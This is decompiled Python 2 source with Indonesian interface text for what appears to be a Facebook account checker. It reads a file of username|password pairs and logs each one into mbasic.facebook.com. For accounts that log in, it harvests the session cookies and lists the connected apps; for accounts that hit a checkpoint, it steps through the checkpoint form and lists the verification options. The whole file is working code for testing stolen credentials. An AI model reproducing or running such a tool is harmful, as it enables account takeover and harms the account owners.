# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) 
# [GCC 7.5.0]
# Embedded file name: /storage/emulated/0/rzk/cek_opsi.py
# Compiled at: 2021-10-24 09:44:13
import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser

def cek_opsi():
    file = raw_input('\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;92m ')
    if file == '':
        exit('\x1b[1;93m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m Wrong Input')
    try:
        self = open(file, 'r').readlines()
    except IOError:
        exit('\x1b[1;93m[\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m File Tidak Ada')

    print '\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Total Akun :\x1b[1;92m %s' % len(self)
    for yes in self:
        fl = yes.replace('\n', '')
        ya = fl.split('|')
        print '\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Check :\x1b[1;96m ' + fl.replace(' + ', '')
        try:
            check_in(ya[0].replace(' + ', ''), ya[1])
        except requests.exceptions.ConnectionError:
            exit('\x1b[1;91m[\x1b[1;93m\xe2\x80\xa2\x1b[1;91m]\x1b[1;93m Koneksi Error')

    exit('\n\x1b[1;92m[\x1b[1;97mSelesai\x1b[1;92m]')


def check_in(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Android 4.0 Blackberry - Mozilla Firefox 8.0'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'}) ][2:]
        print ' \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Aplikasi Terhubung :\x1b[1;92m ' + str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  \x1b[1;92m[\x1b[1;97m' + str(num) + '\x1b[1;92m]\x1b[1;97m ' + _[0][0] + '\x1b[1;97m,\x1b[1;92m ' + _[0][1]

    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        parr = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        proo = [ yy.text for yy in parr.find_all('option') ]
        print ' \x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Terdapat\x1b[1;93m ' + str(len(proo)) + '\x1b[1;97m Opsi'
        for opt in range(len(proo)):
            print '  \x1b[1;93m[\x1b[1;97m' + str(opt + 1) + '\x1b[1;93m]\x1b[1;97m ' + proo[opt]

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m %s' % oh
    else:
        print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m Login gagal periksa username atau password'